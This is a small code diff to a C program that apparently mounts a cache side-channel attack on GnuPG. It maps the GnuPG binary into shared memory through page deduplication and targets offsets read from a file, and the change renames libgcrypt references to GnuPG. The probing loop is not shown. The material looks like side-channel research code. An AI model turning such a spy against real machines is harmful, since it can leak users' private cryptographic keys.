@@ -6,7 +6,7 @@
 
 int NUM_ADDRS = 5;
 int NUM_SLOTS = 20000;
-size_t LIBGCRYPT_SIZE = 3145728;
+size_t GNUPG_SIZE = 4194304;
 
 /* Busy wait for a given cycle */
 void busy_wait(int cycle) {
@@ -63,7 +63,7 @@ int main(int argc, char *argv[]) {
 
     /* Argument parsing */
     if(argc != 4) {
-        fprintf(stderr, "Usage: %s libgcrypt_path target_offsets cycles\n", argv[0]);
+        fprintf(stderr, "Usage: %s gnupg_path target_offsets cycles\n", argv[0]);
         return -1;
     }
     if((fd = open(argv[1], O_RDONLY)) == -1) {
@@ -77,19 +77,19 @@ int main(int argc, char *argv[]) {
     cycles = atoi(argv[3]);
     printf("Time slot: %d cycles\n", cycles);
 
-    /* MMAP libgcyrpt to acheive sharing through page deduplication */
-    void *libgcrypt_ptr = mmap(NULL, LIBGCRYPT_SIZE, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);
-    if(libgcrypt_ptr == MAP_FAILED) {
+    /* MMAP GnuPG to acheive sharing through page deduplication */
+    void *gnupg_ptr = mmap(NULL, GNUPG_SIZE, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);
+    if(gnupg_ptr == MAP_FAILED) {
         fprintf(stderr, "MMAP failed\n");
         return -1;
     }
-    printf("libgcrypt is mapped to %p\n", libgcrypt_ptr);
+    printf("gnupg is mapped to %p\n", gnupg_ptr);
 
     for(i = 0; i < NUM_ADDRS; i++) {
         getline(&line, &len, f);
         line[strlen(line) - 1] = '\0';
         printf("%s\n", line);
-        target_addrs[i] = (char *) ((unsigned long) libgcrypt_ptr + strtol(line, &endptr, 16));
+        target_addrs[i] = (char *) ((unsigned long) gnupg_ptr + strtol(line, &endptr, 16));
         printf("%p\n", target_addrs[i]);
     }
     free(line);
@@ -111,7 +111,7 @@ int main(int argc, char *argv[]) {
         }
     }
 
-    munmap(libgcrypt_ptr, LIBGCRYPT_SIZE);
+    munmap(gnupg_ptr, GNUPG_SIZE);
     fclose(f);
 
     return 0;
